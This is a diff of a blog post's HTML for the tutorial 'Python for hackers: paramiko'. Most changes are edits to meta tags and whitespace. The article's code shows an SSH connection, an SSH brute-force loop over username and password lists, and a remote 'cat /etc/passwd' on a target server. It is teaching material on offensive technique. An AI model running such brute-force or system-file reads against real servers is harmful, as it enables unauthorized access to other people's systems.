@@ -13,30 +13,7 @@
 
 
 <meta name="author" content="Yusuf Talha ARABACI">
-<meta name="description" content="
-  Python for hackers: paramiko
-  
-    
-    Link to heading
-  
-
-
-
-  Introduction
-  
-    
-    Link to heading
-  
-
-Hello, in this article, we will get to know the paramiko module that allows us to establish SSH connections with Python.
-
-  What is paramiko?
-  
-    
-    Link to heading
-  
-
-SSH (Secure Shell) is a cryptographic network protocol used for secure operation of network services over an unsecured network. With SSH, you can connect to and manage your network devices, Linux and Windows machines. It works on port 22 by default.">
+<meta name="description" content="Hello, in this article, we will get to know the paramiko module that allows us to establish SSH connections with Python.">
 <meta name="keywords" content="cybersecurity, infosec, cloud-native security, soc architecture, open source defense, yusuf talha arabaci, malware analysis, pentesting">
 
 
@@ -44,14 +21,12 @@ SSH (Secure Shell) is a cryptographic network protocol used for secure operation
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="http://localhost:1313/images/profile.jpeg">
   <meta name="twitter:title" content="Python for hackers: paramiko">
-  <meta name="twitter:description" content="Python for hackers: paramikoLink to headingIntroductionLink to headingHello, in this article, we will get to know the paramiko module that allows us to establish SSH connections with Python.
-What is paramiko?Link to headingSSH (Secure Shell) is a cryptographic network protocol used for secure operation of network services over an unsecured network. With SSH, you can connect to and manage your network devices, Linux and Windows machines. It works on port 22 by default.">
+  <meta name="twitter:description" content="Hello, in this article, we will get to know the paramiko module that allows us to establish SSH connections with Python.">
 
 <meta property="og:url" content="http://localhost:1313/posts/2022/09/python-for-hackers-paramiko/">
   <meta property="og:site_name" content="Yusuf Talha ARABACI">
   <meta property="og:title" content="Python for hackers: paramiko">
-  <meta property="og:description" content="Python for hackers: paramikoLink to headingIntroductionLink to headingHello, in this article, we will get to know the paramiko module that allows us to establish SSH connections with Python.
-What is paramiko?Link to headingSSH (Secure Shell) is a cryptographic network protocol used for secure operation of network services over an unsecured network. With SSH, you can connect to and manage your network devices, Linux and Windows machines. It works on port 22 by default.">
+  <meta property="og:description" content="Hello, in this article, we will get to know the paramiko module that allows us to establish SSH connections with Python.">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -229,7 +204,6 @@ What is paramiko?Link to headingSSH (Secure Shell) is a cryptographic network 
     <span class="sr-only">Link to heading</span>
   </a>
 </h3>
-<p><img src="https://cdn-images-1.medium.com/max/800/1*cHmfmYLtoze7wtcUFY5BVA.png" alt=""></p>
 <h3 id="introduction">
   Introduction
   <a class="heading-link" href="#introduction">
@@ -268,15 +242,15 @@ What is paramiko?Link to headingSSH (Secure Shell) is a cryptographic network 
 </h3>
 <p>To establish an SSH connection with the Paramiko module;</p>
 <pre tabindex="0"><code>import paramiko
-</code></pre><pre tabindex="0"><code>IP = &#34;ip address&#34;  
-USERNAME = &#34;username&#34;  
-PASSWORD = &#34;password&#34;  
-PORT = 22  
+</code></pre><pre tabindex="0"><code>IP = &#34;ip address&#34;  
+USERNAME = &#34;username&#34;  
+PASSWORD = &#34;password&#34;  
+PORT = 22  
 COMMAND = &#34;command&#34;
-</code></pre><pre tabindex="0"><code>ssh = paramiko.SSHClient() # Create SSH object  
+</code></pre><pre tabindex="0"><code>ssh = paramiko.SSHClient() # Create SSH object  
 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-</code></pre><pre tabindex="0"><code>ssh.connect(ip, username, password) # Establishing SSH connection  
-stdin, stdout, stderr = ssh.exec_command(command) # Run command  
+</code></pre><pre tabindex="0"><code>ssh.connect(ip, username, password) # Establishing SSH connection  
+stdin, stdout, stderr = ssh.exec_command(command) # Run command  
 print(stdout.read())
 </code></pre><pre tabindex="0"><code>ssh.close()
 </code></pre><p>In this example, we created an SSH client with the pramaiko module. The application makes a connection to the specified IP and port address with the username and password information and runs the &lsquo;whoami&rsquo; command. Then it prints the response to the screen and closes the SSH connection.</p>
@@ -291,17 +265,17 @@ print(stdout.read())
 </h3>
 <p>Since we can make an SSH connection with Paramiko, we can also perform a brute force attack. For this, we will create a username list and a password list. Then we will try to establish an SSH connection with the information in this list.</p>
 <pre tabindex="0"><code>import paramiko
-</code></pre><pre tabindex="0"><code>ssh = paramiko.SSHClient()  
-ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
-username_list = []  
+</code></pre><pre tabindex="0"><code>ssh = paramiko.SSHClient()  
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
+username_list = []  
 password_list = []
-</code></pre><pre tabindex="0"><code>for i in username_list:  
-    for j in password_list:  
-        try:  
-            ssh.connect(ip,username=i, password=j)  
-            print(i,j)  
-            ssh.close()  
-        except:  
+</code></pre><pre tabindex="0"><code>for i in username_list:  
+    for j in password_list:  
+        try:  
+            ssh.connect(ip,username=i, password=j)  
+            print(i,j)  
+            ssh.close()  
+        except:  
             pass
 </code></pre><p>In the code above, a username list and a password list are required for the attack, you can add them to the lists in the code. The target IP address must also be given to the ssh.connect() function. Then, when the code is run, the values ​​in the username and password lists are tried one by one for the relevant IP address. In this process, make sure that the SSH service is turned on on the target server. Otherwise, the operation will fail.</p>
 <h3 id="pulling-passwd-file">
@@ -313,10 +287,10 @@ password_list = []
 </h3>
 <p>If we establish an SSH connection, we can perform any operation we want with the shell we receive from the target server. For this we use the <em>ssh.exec_command()</em> method.</p>
 <pre tabindex="0"><code>import paramiko
-</code></pre><pre tabindex="0"><code>ssh = paramiko.SSHClient()  
-ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
-ssh.connect(ip, username, password)  
-stdin, stdout, stderr = ssh.exec_command(“cat /etc/passwd”)  
+</code></pre><pre tabindex="0"><code>ssh = paramiko.SSHClient()  
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
+ssh.connect(ip, username, password)  
+stdin, stdout, stderr = ssh.exec_command(“cat /etc/passwd”)  
 print(stdout.read().decode(‘ascii’))
 </code></pre><p>With the code above, we read the <em>passwd</em> file of the target server and printed it on the screen.</p>
 <h3 id="end">
